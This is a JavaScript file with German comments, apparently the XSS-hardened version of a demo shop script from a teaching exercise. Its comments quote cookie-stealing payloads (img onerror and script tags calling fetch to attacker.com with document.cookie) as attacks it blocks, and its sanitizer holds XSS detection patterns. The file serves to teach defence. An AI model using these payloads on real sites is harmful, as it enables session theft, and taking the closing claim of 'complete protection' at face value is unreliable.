/**
 * ================================================================
 * XSS-SICHERE VERSION DES TECHSTORE SCRIPTS
 * ================================================================
 *
 * HAUPTSICHERHEITSMASSNAHMEN:
 *
 * 1. CONTENT SECURITY POLICY (CSP)
 *    - Im HTML-Header definiert
 *    - Blockiert externe Scripts und inline-Event-Handler
 *    - Erlaubt nur Scripts von derselben Quelle (self)
 *
 * 2. TEXTCONTENT STATT INNERHTML
 *    - textContent interpretiert Eingaben NUR als Text, niemals als HTML
 *    - Verhindert HTML-Injection und Script-Ausführung
 *
 * 3. CREATEELEMENT() + CREATETEXTNODE()
 *    - Sichere DOM-Manipulation ohne HTML-Parsing
 *    - Unmöglich, JavaScript-Code einzuschleusen
 *
 * 4. INPUT SANITIZATION
 *    - Entfernt gefährliche Zeichen und Patterns
 *    - Zusätzliche Schutzschicht vor XSS-Angriffen
 *
 * 5. KEINE EVAL() ODER FUNCTION() KONSTRUKTOREN
 *    - Verhindert dynamische Code-Ausführung
 */

/**
 * SICHERHEITSFUNKTION: Bereinigt Benutzereingaben
 *
 * Diese Funktion ist die erste Verteidigungslinie gegen XSS-Angriffe.
 * Sie entfernt alle potenziell gefährlichen Muster aus Benutzereingaben.
 *
 * ENTFERNTE PATTERNS:
 * - <script> Tags und deren Inhalt
 * - Event-Handler (onerror, onclick, onload, etc.)
 * - javascript: URLs
 * - data: URLs (können für XSS missbraucht werden)
 * - < und > Zeichen (verhindert HTML-Tags komplett)
 *
 * WARUM WICHTIG:
 * Selbst wenn innerHTML verwendet würde, würde diese Funktion
 * die gefährlichen Teile bereits entfernt haben.
 */
function sanitizeInput(input) {
    if (typeof input !== 'string') {
        return '';
    }

    let sanitized = input;

    // Entfernt alle Script-Tags und deren Inhalt
    // Regex erklärt: Findet script-Tags gefolgt von beliebigem Inhalt
    sanitized = sanitized.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '');

    // Entfernt alle Event-Handler Attribute
    // Regex erklärt: Findet "on" gefolgt von Wortzeichen (onclick, onerror, etc.)
    // mit = und einem Wert in Anführungszeichen oder ohne
    sanitized = sanitized.replace(/on\w+\s*=\s*["'][^"']*["']/gi, '');
    sanitized = sanitized.replace(/on\w+\s*=\s*[^\s>]*/gi, '');

    // Entfernt javascript: URLs
    // Diese können in href oder src Attributen für XSS verwendet werden
    sanitized = sanitized.replace(/javascript:/gi, '');

    // Entfernt data: URLs
    // data:text/html kann HTML mit Scripts enthalten
    sanitized = sanitized.replace(/data:text\/html/gi, '');

    // ZUSÄTZLICHER SCHUTZ: Entfernt < und > komplett
    // Dies verhindert jegliche HTML-Tag-Injection
    sanitized = sanitized.replace(/</g, '&lt;').replace(/>/g, '&gt;');

    return sanitized;
}

/**
 * SICHERE HILFSFUNKTION: Erstellt ein DOM-Element mit Text
 *
 * Diese Funktion kapselt das sichere Pattern für DOM-Manipulation:
 * 1. createElement() erstellt ein leeres Element
 * 2. createTextNode() erstellt einen reinen Textknoten
 * 3. appendChild() fügt den Textknoten hinzu
 *
 * WARUM SICHER:
 * - createTextNode() kann niemals HTML oder JavaScript ausführen
 * - Der Text wird immer als reiner Text behandelt, egal was eingegeben wird
 * - Selbst <script>alert('XSS')</script> wird nur als Text angezeigt
 */
function createElementWithText(tag, text, className) {
    const element = document.createElement(tag);
    if (className) {
        element.className = className;
    }
    if (text) {
        // WICHTIG: createTextNode() statt innerHTML
        element.appendChild(document.createTextNode(text));
    }
    return element;
}

/**
 * SICHERE HILFSFUNKTION: Setzt Inline-Styles sicher
 *
 * Verwendet setAttribute() statt direkter String-Manipulation
 */
function setStyles(element, stylesString) {
    element.setAttribute('style', stylesString);
}

// URL-Parameter sicher auslesen
const urlParams = new URLSearchParams(window.location.search);

/**
 * SICHERHEITSLÜCKE 1 GEFIXT: Search Query
 *
 * ORIGINAL (UNSICHER):
 * searchResultsDiv.innerHTML = '...' + searchQuery + '...'
 *
 * PROBLEM:
 * Ein Angreifer könnte ?search=<img src=x onerror="alert('XSS')"> eingeben
 * und der Code würde ausgeführt.
 *
 * LÖSUNG (SICHER):
 * 1. sanitizeInput() bereinigt die Eingabe
 * 2. createElement() erstellt sichere DOM-Elemente
 * 3. createTextNode() fügt Text ohne HTML-Parsing ein
 *
 * ANGRIFF BLOCKIERT:
 * ?search=<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
 * - < und > werden zu &lt; und &gt; escaped
 * - onerror würde entfernt (falls < und > durchkämen)
 * - createTextNode() würde es als Text behandeln
 * - KEIN Code wird ausgeführt, KEINE Cookies werden gestohlen
 */
const searchQuery = urlParams.get('search');
if (searchQuery) {
    const searchResultsDiv = document.getElementById('searchResults');
    if (searchResultsDiv) {
        // Bereinige die Suchquery
        const sanitizedQuery = sanitizeInput(searchQuery);

        // Erstelle Container
        const container = document.createElement('div');
        setStyles(container, 'max-width: 1200px; margin: 20px auto; padding: 20px; background: white; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1);');

        // Erstelle Header-Bereich
        const headerDiv = document.createElement('div');
        setStyles(headerDiv, 'margin-bottom: 15px;');

        const strongLabel = createElementWithText('strong', 'Suchergebnisse für:');
        setStyles(strongLabel, 'font-size: 18px; color: #212529;');

        const querySpan = createElementWithText('span', sanitizedQuery);
        setStyles(querySpan, 'color: #667eea; font-size: 18px; font-weight: 600;');

        headerDiv.appendChild(strongLabel);
        headerDiv.appendChild(document.createTextNode(' '));
        headerDiv.appendChild(querySpan);

        // Erstelle "Keine Ergebnisse" Bereich
        const noResultsDiv = document.createElement('div');
        setStyles(noResultsDiv, 'padding: 40px; text-align: center; color: #6c757d; background: #f8f9fa; border-radius: 4px;');

        const iconDiv = createElementWithText('div', '🔍');
        setStyles(iconDiv, 'font-size: 48px; margin-bottom: 15px;');

        const messageP = createElementWithText('p', 'Leider wurden keine passenden Produkte gefunden. Bitte versuchen Sie es mit anderen Suchbegriffen.');
        setStyles(messageP, 'font-size: 16px; margin: 0;');

        noResultsDiv.appendChild(iconDiv);
        noResultsDiv.appendChild(messageP);

        // Füge alles zusammen
        container.appendChild(headerDiv);
        container.appendChild(noResultsDiv);
        searchResultsDiv.appendChild(container);
        searchResultsDiv.style.display = 'block';

        // Setze den Wert im Suchfeld sicher
        const searchInput = document.querySelector('input[name="search"]');
        if (searchInput) {
            // value-Eigenschaft ist sicher, da sie automatisch escaped wird
            searchInput.value = sanitizedQuery;
        }
    }
}

/**
 * SICHERHEITSLÜCKE 2 GEFIXT: Promo Banner
 */
const promo = urlParams.get('promo');
if (promo) {
    const promoDiv = document.getElementById('promoBanner');
    if (promoDiv) {
        const sanitizedPromo = sanitizeInput(promo);

        const container = document.createElement('div');
        setStyles(container, 'background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%); color: white; padding: 15px; text-align: center;');

        // Verwende createTextNode für sicheren Text
        container.appendChild(document.createTextNode('🎉 Promotion aktiv: ' + sanitizedPromo + ' - Jetzt von exklusiven Rabatten profitieren!'));

        promoDiv.appendChild(container);
        promoDiv.style.display = 'block';
    }
}

/**
 * SICHERHEITSLÜCKE 4 GEFIXT: Error Message
 */
const error = urlParams.get('error');
if (error) {
    const errorDiv = document.getElementById('errorDisplay');
    if (errorDiv) {
        const sanitizedError = sanitizeInput(error);

        const container = document.createElement('div');
        setStyles(container, 'max-width: 1200px; margin: 20px auto; padding: 20px; background: #fff3cd; border-left: 5px solid #ffc107; border-radius: 4px;');

        const strong = createElementWithText('strong', '⚠️ Fehler:');
        setStyles(strong, 'color: #856404;');

        container.appendChild(strong);
        container.appendChild(document.createTextNode(' ' + sanitizedError));

        errorDiv.appendChild(container);
        errorDiv.style.display = 'block';
    }
}

/**
 * SICHERHEITSLÜCKE 5 GEFIXT: Filter Display
 */
const filter = urlParams.get('filter');
if (filter) {
    const filterDiv = document.getElementById('filterDisplay');
    if (filterDiv) {
        const sanitizedFilter = sanitizeInput(filter);

        const container = document.createElement('div');
        setStyles(container, 'max-width: 1200px; margin: 20px auto; padding: 15px; background: #e7f3ff; border-left: 5px solid #2196F3; border-radius: 4px;');

        const strong = createElementWithText('strong', '🔍 Aktiver Filter:');

        const link = document.createElement('a');
        link.href = 'secure_website.html';
        link.appendChild(document.createTextNode('✕ Filter entfernen'));
        setStyles(link, 'margin-left: 15px; color: #dc3545; text-decoration: none; font-weight: 600;');

        container.appendChild(strong);
        container.appendChild(document.createTextNode(' ' + sanitizedFilter + ' '));
        container.appendChild(link);

        filterDiv.appendChild(container);
        filterDiv.style.display = 'block';
    }
}

/**
 * SICHERHEITSLÜCKE 6 GEFIXT: Product Review Display
 *
 * BESONDERS KRITISCH: Hier können Benutzer beliebigen Text eingeben
 *
 * ANGRIFF BLOCKIERT:
 * ?reviewer=Hacker&review=<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
 * - Script-Tags werden entfernt durch sanitizeInput()
 * - < und > werden escaped
 * - createTextNode() würde es ohnehin als Text behandeln
 */
const reviewer = urlParams.get('reviewer');
const review = urlParams.get('review');
if (reviewer && review) {
    const reviewDiv = document.getElementById('reviewDisplay');
    if (reviewDiv) {
        const sanitizedReviewer = sanitizeInput(reviewer);
        const sanitizedReview = sanitizeInput(review);

        const container = document.createElement('div');
        setStyles(container, 'background: #f8f9fa; padding: 25px; border-radius: 8px; border-left: 4px solid #28a745;');

        // Header mit Avatar
        const headerDiv = document.createElement('div');
        setStyles(headerDiv, 'display: flex; align-items: center; margin-bottom: 10px;');

        const avatar = createElementWithText('div', '👤');
        setStyles(avatar, 'width: 50px; height: 50px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-size: 24px; margin-right: 15px;');

        const authorDiv = document.createElement('div');
        const authorName = createElementWithText('strong', sanitizedReviewer);
        setStyles(authorName, 'font-size: 18px;');
        const stars = createElementWithText('span', '★★★★★');
        setStyles(stars, 'color: #ffc107;');

        authorDiv.appendChild(authorName);
        authorDiv.appendChild(document.createElement('br'));
        authorDiv.appendChild(stars);

        headerDiv.appendChild(avatar);
        headerDiv.appendChild(authorDiv);

        // Review Text
        const reviewP = createElementWithText('p', sanitizedReview);
        setStyles(reviewP, 'margin: 15px 0 0 0; color: #333; line-height: 1.6;');

        // Bestätigung
        const confirmDiv = createElementWithText('div', '✓ Vielen Dank für Ihre Bewertung! Sie hilft anderen Kunden bei der Kaufentscheidung.');
        setStyles(confirmDiv, 'margin-top: 15px; padding: 10px; background: #d4edda; border-radius: 4px; color: #155724;');

        container.appendChild(headerDiv);
        container.appendChild(reviewP);
        container.appendChild(confirmDiv);

        reviewDiv.appendChild(container);
        reviewDiv.style.display = 'block';
    }
}

/**
 * Shopping Cart Funktionalität (unverändert, da keine User-Input-Verarbeitung)
 */
let cartCount = 0;
const cartBadge = document.querySelector('.badge');
const addToCartButtons = document.querySelectorAll('.add-to-cart-btn');

addToCartButtons.forEach(button => {
    button.addEventListener('click', function(e) {
        e.preventDefault();
        cartCount++;
        if (cartBadge) {
            cartBadge.textContent = cartCount;
        }

        // Visual Feedback
        this.textContent = '✓ Hinzugefügt';
        this.style.background = '#28a745';

        setTimeout(() => {
            this.textContent = 'In den Warenkorb';
            this.style.background = '#212529';
        }, 1500);
    });
});

/**
 * ================================================================
 * ZUSAMMENFASSUNG DER SICHERHEITSMASSNAHMEN
 * ================================================================
 *
 * WARUM IST DIESE VERSION XSS-SICHER?
 *
 * 1. CONTENT SECURITY POLICY (CSP)
 *    - Erste Verteidigungslinie im Browser
 *    - Blockiert externe Scripts und inline-Event-Handler
 *    - Selbst wenn XSS durchkommt, wird es nicht ausgeführt
 *
 * 2. INPUT SANITIZATION
 *    - sanitizeInput() entfernt gefährliche Patterns
 *    - < und > werden escaped zu &lt; und &gt;
 *    - Script-Tags und Event-Handler werden entfernt
 *
 * 3. SICHERE DOM-MANIPULATION
 *    - createElement() statt String-Konkatenation
 *    - createTextNode() statt innerHTML
 *    - Kein HTML-Parsing von Benutzereingaben
 *
 * 4. MEHRSCHICHTIGER SCHUTZ (Defense in Depth)
 *    - CSP (Browser-Ebene)
 *    - Input Sanitization (Daten-Ebene)
 *    - Sichere DOM-APIs (Code-Ebene)
 *    - Selbst wenn eine Schicht versagt, schützen die anderen
 *
 * BEISPIEL: Der Payload wird blockiert:
 * <img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
 *
 * Schutz-Schicht 1 (Sanitization): < wird zu &lt;, > wird zu &gt;
 * Schutz-Schicht 2 (createTextNode): Würde es als Text behandeln
 * Schutz-Schicht 3 (CSP): Würde fetch() zu externen Domains blockieren
 *
 * RESULTAT: Vollständiger Schutz gegen XSS-Angriffe!
 */
